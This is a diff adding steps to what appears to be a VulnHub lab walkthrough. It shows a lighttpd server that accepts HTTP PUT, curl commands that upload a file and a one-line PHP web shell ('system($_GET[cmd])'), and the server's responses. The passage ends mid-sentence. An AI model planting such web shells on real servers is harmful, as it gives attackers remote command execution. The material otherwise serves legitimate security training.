@@ -60,15 +60,64 @@ root@kali: curl http://192.168.127.230/test -X OPTIONS -v
 < 
 * Connection #0 to host 192.168.127.230 left intact
 ```
+
  we can see that allowed methods are strang and one of them is put, so we can simply test if we can upload a file here :
 
- 
+ ```bash
+root@kali: curl 192.168.127.230/test/ -X PUT -T ./file.txt -v
+
+*   Trying 192.168.127.230:80...
+* Connected to 192.168.127.230 (192.168.127.230) port 80
+> PUT /test/file.txt HTTP/1.1
+> Host: 192.168.127.230
+> User-Agent: curl/8.3.0
+> Accept: */*
+> Content-Length: 0
+> 
+< HTTP/1.1 200 OK
+< Content-Length: 0
+< Date: Wed, 25 Oct 2023 17:07:43 GMT
+< Server: lighttpd/1.4.28
+< 
+* Connection #0 to host 192.168.127.230 left intact
+```
+
+ and yes we uploaded our file into the /test directory:
+
+ ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/496d9819-6b06-48ec-8ccb-cd4c45b58a7f)
+
+now we can check to upload a php file to send command, i made a file called `shell.php` with the following content :
+
+```php
+<?php system($_GET["cmd"]);
+```
+and uploaded it :
+
+```bash
+root@kali: curl 192.168.127.230/test/ -X PUT -T ./shell.php -v
+
+*   Trying 192.168.127.230:80...
+* Connected to 192.168.127.230 (192.168.127.230) port 80
+> PUT /test/shell.php HTTP/1.1
+> Host: 192.168.127.230
+> User-Agent: curl/8.3.0
+> Accept: */*
+> Content-Length: 28
+> 
+* We are completely uploaded and fine
+< HTTP/1.1 201 Created
+< Content-Length: 0
+< Date: Wed, 25 Oct 2023 17:12:08 GMT
+< Server: lighttpd/1.4.28
+< 
+* Connection #0 to host 192.168.127.230 left intact
+```
+ and yes we uploaded the file :
+
+ ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1eea3aca-eb29-4136-a03f-c8fafd9bf618)
 
 
-
-
-
-
+now le
 
 
 
